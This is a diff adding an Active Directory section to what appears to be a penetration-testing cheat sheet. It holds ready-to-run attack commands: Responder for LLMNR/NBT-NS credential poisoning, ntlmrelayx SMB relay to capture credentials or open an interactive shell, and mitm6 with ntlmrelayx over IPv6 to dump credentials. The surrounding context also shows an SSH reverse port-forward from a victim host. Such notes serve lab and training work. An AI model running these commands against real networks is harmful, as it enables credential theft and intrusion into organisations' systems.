@@ -112,6 +112,10 @@ Table of Contents
          * [Windows privesc/enum tools](#windows-privescenum-tools)
          * [Windows precompiled exploits](#windows-precompiled-exploits)
          * [Windows Port Forwarding](#windows-port-forwarding)
+   * [<strong>Active Directory</strong>](#active-directory)
+      * [LLMNR/NBT-NS](#llmnrnbt-ns)
+      * [SMB Relay Attack](#smb-relay-attack)
+      * [IPv6 Attack](#ipv6-attack)
    * [<strong>Loot</strong>](#loot)
       * [Linux](#linux-1)
          * [Proof](#proof)
@@ -2202,6 +2206,30 @@ Run in victim (5985 WinRM):
 
 `ssh -l kali -pw P@$$word -R 445:127.0.0.1:445 10.10.16.155`
 
+# **Active Directory**
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
+
+## LLMNR/NBT-NS
+```
+responder -I eth0 -rdwv #Credential default capture settings
+```
+
+##  SMB Relay Attack
+```
+python3 /home/kali/.local/bin/ntlmrelayx.py -tf targets.txt -smb2support #Capture creds via SMB (Signing must be 'disabled/not required')
+
+python3 /home/kali/.local/bin/ntlmrelayx.py -tf targets.txt -smb2support -i # Gain a interactive shell with "-i"
+```
+
+## IPv6 Attack
+
+https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+```
+sudo mitm6 -d marvel.local #Run mitm6 first to IPv6 server
+
+python3 /home/kali/.local/bin/ntlmrelayx.py -6 -t ldaps://192.168.68.122 -wh fakewpad.marvel.local -l lootme #Captures IPv6 request to capture & dump creds to lootme
+```
 
 
 # **Loot**
